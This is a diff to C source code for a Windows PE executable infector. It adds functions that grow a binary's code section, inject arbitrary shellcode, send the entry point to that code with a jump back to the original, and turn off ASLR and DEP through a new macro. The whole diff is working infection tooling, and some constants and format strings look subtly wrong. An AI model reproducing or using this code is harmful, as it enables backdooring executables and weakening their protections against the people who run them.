@@ -6,20 +6,14 @@
 #include "PE.h"
 
 
+#define DISABLE_DEP_ASLR nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE; \
+	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED; \
+	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0; \
+	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0; \
+	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
 
 
-void pe_print_section_header(pe_section_header* header) {
-	fprintf(stdout, "Section name: %s\n", header->name);
-	fprintf(stdout, "Section VirtualSize: 0x%08X\n", header->Misc.VirtualSize);
-	fprintf(stdout, "Section VirtualAddress: 0x%08X\n", header->VirtualAddress);
-	fprintf(stdout, "Section SizeOfRawData: %u\n", header->SizeOfRawData);
-	fprintf(stdout, "Section PointerToRawData: 0x%08X\n", header->PointerToRawData);
-	fprintf(stdout, "Section PointerToRelocations: 0x%08X\n", header->PointerToRelocations);
-	fprintf(stdout, "Section PointerToLinenumbers: 0x%08X\n", header->PointerToLinenumbers);
-	fprintf(stdout, "Section NumberOfRelocations: %u\n", header->NumberOfRelocations);
-	fprintf(stdout, "Section NumberOfLinenumbers: %u\n", header->NumberOfLinenumbers);
-	fprintf(stdout, "Section Characteristics: 0x%08X\n", header->Characteristics);
-}
+
 
 int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
@@ -94,14 +88,7 @@ int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsig
 	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
-	//disable ASLR for all
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE;
-	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED;
-	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0;
-	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0;
-	
-	//disable DEP
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
+	DISABLE_DEP_ASLR
 	
 	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
 	
@@ -187,14 +174,7 @@ int pe64_infect_section(pe64_nt_header* nt_header, list_pe_section_t sections, u
 	fprintf(stdout, "original entry point 0x%016lX\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
-	//disable ASLR for all
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE;
-	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED;
-	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0;
-	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0;
-	
-	//disable DEP
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
+	DISABLE_DEP_ASLR
 	
 	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
 	
@@ -256,7 +236,7 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	//fill header
 	memset(&newSect->header, 0, sizeof(pe_section_header));
 	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
-	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size, nt_header->nt_optional_header.section_alignment);
+	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
 	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
 	newSect->header.SizeOfRawData = P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
 	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
@@ -337,14 +317,7 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
-	//disable ASLR for all
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE;
-	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED;
-	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0;
-	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0;
-	
-	//disable DEP
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
+	DISABLE_DEP_ASLR
 	
 	return 0;
 }
@@ -398,7 +371,7 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 	//fill header
 	memset(&newSect->header, 0, sizeof(pe_section_header));
 	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
-	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size, nt_header->nt_optional_header.section_alignment);
+	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.section_alignment);
 	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
 	newSect->header.SizeOfRawData = P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.file_alignment);
 	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
@@ -478,17 +451,195 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 	//new entry point
 	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_offset;
 	
+	fprintf(stdout, "original entry point 0x%16X\n", original_entry_point);
+	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
+	
+	DISABLE_DEP_ASLR
+	
+	return 0;
+}
+
+int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
+	if (!nt_header || !sections || !xcode || *xcode == '\0') {
+		return -1;
+	}
+	
+	//search first code sections and nearest section in virtual space
+	list_pe_section_t codeSect = NULL;
+	list_pe_section_t nearSect = NULL;
+	list_pe_section_t curSect = sections;
+	
+	while (curSect) {
+		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && !codeSect) { //that section is code section
+			codeSect = curSect;
+			curSect = sections;
+			continue;
+		}
+		
+		if (codeSect && curSect != codeSect) {
+			uint32_t edge = P2ALIGNUP(codeSect->header.Misc.VirtualSize + codeSect->header.VirtualAddress, nt_header->nt_optional_header.section_alignment);
+			
+			if (!nearSect) {
+				nearSect = curSect;
+			} else {
+				if ((curSect->header.VirtualAddress - edge) < (nearSect->header.VirtualAddress - edge)) {
+					nearSect = curSect;
+				}
+			}
+		}
+		
+		curSect = curSect->next;
+	}
+	
+	if (!codeSect) {
+		//that file is not contain code section (is it possible?)
+		return -2;
+	}
+	
+	//resize code sect
+	uint32_t newVirtualSize = P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
+	uint32_t newRawSize = P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
+	
+	if ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress) {
+		//not possible for resizing section
+		return -3;
+	}
+	
+	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
+	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
+	codeSect->header.Misc.VirtualSize = newVirtualSize;
+	codeSect->header.SizeOfRawData = newRawSize;
+	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
+	
+	if (!codeSect->data) {
+		//cannot allocate memory for new data
+		return -4;
+	}
+	
+	//align another sections (if it need)
+	curSect = sections;
+	while (curSect) {
+		if (curSect->header.PointerToRawData > codeSect->header.PointerToRawData) {
+			curSect->header.PointerToRawData += diff_rawSize;
+		}
+		
+		curSect = curSect->next;
+	}
+	
+	//inject xcode
+	uint32_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
+	char mov_eax_bytecode[] = "\xb8";
+	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
+	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
+	
+	//new entry point
+	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
+	
 	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
-	//disable ASLR for all
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE;
-	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED;
-	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0;
-	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0;
+	DISABLE_DEP_ASLR
 	
-	//disable DEP
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
+	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
+	
+	//xcode injection
+	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	
+	return 0;
+}
+
+int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
+	if (!nt_header || !sections || !xcode || *xcode == '\0') {
+		return -1;
+	}
+	
+	//search first code sections and nearest section in virtual space
+	list_pe_section_t codeSect = NULL;
+	list_pe_section_t nearSect = NULL;
+	list_pe_section_t curSect = sections;
+	
+	while (curSect) {
+		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && !codeSect) { //that section is code section
+			codeSect = curSect;
+			curSect = sections;
+			continue;
+		}
+		
+		if (codeSect && curSect != codeSect) {
+			uint32_t edge = P2ALIGNUP(codeSect->header.Misc.VirtualSize + codeSect->header.VirtualAddress, nt_header->nt_optional_header.section_alignment);
+			
+			if (!nearSect) {
+				nearSect = curSect;
+			} else {
+				if ((curSect->header.VirtualAddress - edge) < (nearSect->header.VirtualAddress - edge)) {
+					nearSect = curSect;
+				}
+			}
+		}
+		
+		curSect = curSect->next;
+	}
+	
+	if (!codeSect) {
+		//that file is not contain code section (is it possible?)
+		return -2;
+	}
+	
+	//resize code sect
+	uint32_t newVirtualSize = P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 016, nt_header->nt_optional_header.section_alignment);
+	uint32_t newRawSize = P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x16, nt_header->nt_optional_header.file_alignment);
+	
+	if ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress) {
+		//not possible for resizing section
+		return -3;
+	}
+	
+	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
+	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
+	codeSect->header.Misc.VirtualSize = newVirtualSize;
+	codeSect->header.SizeOfRawData = newRawSize;
+	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
+	
+	if (!codeSect->data) {
+		//cannot allocate memory for new data
+		return -4;
+	}
+	
+	//align another sections (if it need)
+	curSect = sections;
+	while (curSect) {
+		if (curSect->header.PointerToRawData > codeSect->header.PointerToRawData) {
+			curSect->header.PointerToRawData += diff_rawSize;
+		}
+		
+		curSect = curSect->next;
+	}
+	
+	//inject xcode
+	uint64_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
+	char mov_rax_bytecode[] = "\x48\xb8";
+	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF,
+										(char)(original_entry_point >> 32) & 0xFF, (char)(original_entry_point >> 40) & 0xFF, (char)(original_entry_point >> 48) & 0xFF, (char)(original_entry_point >> 56) & 0xFF };
+	char jmp_rax_nop_bytecode[] = "\xff\xe0\x90\x90\x90\x90";
+	
+	//new entry point
+	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
+	
+	fprintf(stdout, "original entry point 0x%16X\n", original_entry_point);
+	fprintf(stdout, "injection new_entry_point 0x%16X\n", nt_header->nt_optional_header.address_of_entry_point);
+	
+	DISABLE_DEP_ASLR
+	
+	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
+	
+	//xcode injection
+	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_rax_bytecode, sizeof(mov_rax_bytecode));
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_rax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_rax_bytecode) + sizeof(hex_original_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
 	
 	return 0;
 }
